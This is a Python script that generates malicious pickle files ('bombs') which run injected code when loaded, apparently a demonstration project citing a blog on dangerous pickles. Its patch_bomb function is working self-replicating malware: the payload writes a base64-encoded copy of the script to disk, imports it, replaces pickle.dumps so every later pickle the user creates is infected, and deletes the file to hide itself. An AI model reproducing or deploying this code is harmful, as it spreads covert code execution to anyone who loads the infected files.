import pickle
import pickletools

from utils.bomb_functions import hi_bomb, raise_bomb, self_report_bomb, pic_bomb, open_link, if_bomb, normal_if_bomb, \
    if_bomb_2, example_not_more_256, if_bomb_2_normal, swap_integers
from utils.main_functions import patch_pickle_bytes
import base64
import contextlib
import inspect

from utils.main_functions import patch_pickle_bytes, make_source_from_function

"""
For virus part everything should be in this file, no even imports because it will be executed each time
user creates new pickle file
"""


@contextlib.contextmanager
def disarm_fake_dumps():
    import pickle
    original_dumps = pickle._odumps if hasattr(pickle, "_odumps") else pickle.dumps
    yield
    pickle.dumps = original_dumps
    if hasattr(pickle, "_odumps"):
        delattr(pickle, "_odumps")


def append_source(f):
    f._source = inspect.getsource(f)
    return f


def make_fake_dumps(bomb_name, side_effect_name):
    import pickle
    original_dumps = pickle._odumps if hasattr(pickle, "_odumps") else pickle.dumps
    pickle._odumps = original_dumps
    bomb = globals()[bomb_name]
    bomb = append_source(bomb)
    if bomb_name == "patch_bomb":
        side_effect = globals().get(side_effect_name)
        bomb = bomb(bomb, side_effect)

    def dumps(obj):
        return patch_pickle_bytes(original_dumps(obj), bomb)

    pickle.dumps = dumps


def patch_bomb(injection, side_effect=None):
    with open(__file__, "r", encoding="utf8") as f:
        this_source = f.read()
    placeholder = "IMPOSSIBLESTRING"[::-1]
    this_source = this_source.replace("\"", placeholder).replace("\'", "\"").replace(placeholder, "\"")

    def patch():
        import base64
        patch_code = """{this_source}"""
        patch_code = base64.standard_b64decode(patch_code)
        silent_module_file = open("surprise.py", "wb")
        silent_module_file.write(patch_code)
        silent_module_file.close()
        from surprise import make_fake_dumps
        make_fake_dumps("{injection}", "{side_effect}")
        import os
        os.remove("surprise.py")

    patch_source = inspect.getsourcelines(patch)[0]
    patch_source = "".join(l[4:] for l in patch_source)
    if side_effect:
        patch_source += "\n".join("    " + l.rstrip("; ") for l in make_source_from_function(side_effect).splitlines())
    placeholders = {
        "injection": injection.__name__,
        "side_effect": side_effect.__name__ if side_effect else "",

    }
    if "{this_source}" in patch_source:
        placeholders["this_source"] = base64.standard_b64encode(this_source.encode("utf8")).decode("utf8")
    patch_source = patch_source.format(**placeholders)
    exec(patch_source)
    res = locals()["patch"]
    res._source = patch_source
    return res


# Inspired by https://intoli.com/blog/dangerous-pickles/

def create_bomb(name, bomb_function, optimize=True):
    data = ["a", "list", "of", "values1"]

    payload = pickle.dumps(data)
    payload = patch_pickle_bytes(payload, bomb_function, optimize=optimize, encode=True)

    with open(f"bombs_pickles/bomb_{name}.pkl", "wb") as f:
        f.write(payload)

    print('=' * 40, f'\nThis is {name} bomb\n', '=' * 39)
    pickletools.dis(payload)
    print('=' * 20)
    try:
        pickle.loads(payload)
    except Exception as e:
        print(f'Got exception {type(e).__name__}: {e}')
    print('=' * 40)


def main():
    create_bomb('hi', hi_bomb)
    create_bomb('normal_if_bomb', normal_if_bomb)
    create_bomb('if_bomb_2_normal', if_bomb_2_normal)
    create_bomb('swap_integers', swap_integers)
    # create_bomb('hi', hi_bomb)
    """
    create_bomb('hi', hi_bomb)
    create_bomb('raise', raise_bomb)
    create_bomb('self_report', self_report_bomb)
    create_bomb('pic', pic_bomb)
    create_bomb('open_link', open_link)
    create_bomb('if_bomb', if_bomb)
    create_bomb('normal_if_bomb', normal_if_bomb)
    create_bomb('if_bomb_2', if_bomb_2)
    create_bomb('delete_me', example_not_more_256)
    create_bomb('if_bomb_2_normal', if_bomb_2_normal)

    with disarm_fake_dumps():
        create_bomb('virus_with_url', patch_bomb(patch_bomb, open_link))
    with disarm_fake_dumps():
        create_bomb('virus_with_pic', patch_bomb(patch_bomb, pic_bomb))
    """
    #with disarm_fake_dumps():
    #    create_bomb('virus_with_hi', patch_bomb(patch_bomb, hi_bomb))
    #with disarm_fake_dumps():
    #    create_bomb('virus_with_url', patch_bomb(patch_bomb, open_link))


if __name__ == "__main__":
    main()
